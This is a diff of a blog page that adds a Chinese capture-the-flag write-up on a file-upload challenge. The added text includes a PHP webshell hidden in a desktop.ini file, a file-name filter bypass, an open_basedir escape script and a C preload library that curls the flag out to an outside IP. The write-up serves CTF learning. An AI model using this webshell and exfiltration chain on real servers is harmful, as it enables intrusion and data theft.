@@ -35,8 +35,15 @@
 <meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/3.png">
 <meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/4.png">
 <meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/12.png">
 <meta property="article:published_time" content="2020-10-11T10:11:24.000Z">
-<meta property="article:modified_time" content="2020-10-13T10:32:59.330Z">
+<meta property="article:modified_time" content="2020-10-13T11:27:54.847Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="CTFER小白选手">
 <meta name="twitter:card" content="summary">
@@ -225,7 +232,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-10-13 18:32:59" itemprop="dateModified" datetime="2020-10-13T18:32:59+08:00">2020-10-13</time>
+                <time title="Modified: 2020-10-13 19:27:54" itemprop="dateModified" datetime="2020-10-13T19:27:54+08:00">2020-10-13</time>
               </span>
 
           
@@ -275,7 +282,42 @@
 <li>php-fpm</li>
 </ul>
 <h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>上传文件，经过测试，只有jpg文件才能成功上传，当时比赛环境是被WAF检测的文件都会504</p>
-<p>采取</p>
+<p>采取<code>1.p\nh\np\n</code>绕过，同时小马用<code>desktop.ini</code>污染</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ï¿½ï¿½</span><br><span class="line">[.ShellClassInfo]</span><br><span class="line">LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,<span class="number">-21770</span></span><br><span class="line">IconResource=%SystemRoot%\system32\imageres.dll,<span class="number">-112</span></span><br><span class="line">IconFile=%SystemRoot%\system32\shell32.dll</span><br><span class="line">IconIndex=<span class="number">-235</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$_GET[<span class="number">0</span>]($_GET[<span class="number">1</span>]);phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看一下能不能上传成功</p>
+<img src="/2020/10/11/westlake/6.png" class="">
+
+<p>成功上传，访问<code>/upload/1.php</code>，看一下当前目录</p>
+<img src="/2020/10/11/westlake/7.png" class="">
+
+<p>没得到啥有用的信息，来读取一下<code>index.php</code></p>
+<img src="/2020/10/11/westlake/8.png" class="">
+
+<p>只是一个文件上传的判断，但是<code>open_basedir</code>限制,绕过读取一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;suanve&#39;);chdir(&#39;suanve&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);</span><br><span class="line">var_dump(scandir(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&quot;.$_GET[&#39;dir&#39;]));</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/10/11/westlake/9.png" class="">
+
+<p>修改上传的shell，尝试读取<code>flag</code>，发现权限不够</p>
+<p>列<code>tmp</code>目录，可以发现sock文件</p>
+<img src="/2020/10/11/westlake/10.png" class="">
+
+<p>下面的步骤来自几篇博客文章</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;06&#x2F;10&#x2F;2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;186186#h2-7</span><br></pre></td></tr></table></figure>
+
+<p>在自己的服务器上部署so文件，用<code>gcc</code>编译</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"curl 123.56.22.0:6666/`/readflag`"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload是改自p神的项目，附上地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;phith0n&#x2F;9615e2420f31048f7e30f3937356cf75</span><br></pre></td></tr></table></figure>
+
+<p>具体的原理可以看一下上面的两篇文章，下面就直接放复现的payload截图了</p>
+<img src="/2020/10/11/westlake/11.png" class="">
+
+<p>通过<code>copy</code>函数，将自己服务器上编译完成的so文件复制到题目的<code>tmp</code>路径下，再访问上传的文件，同时监听6666端口，可以看到flag被成功带出</p>
+<img src="/2020/10/11/westlake/12.png" class="">
+
 
     </div>
 
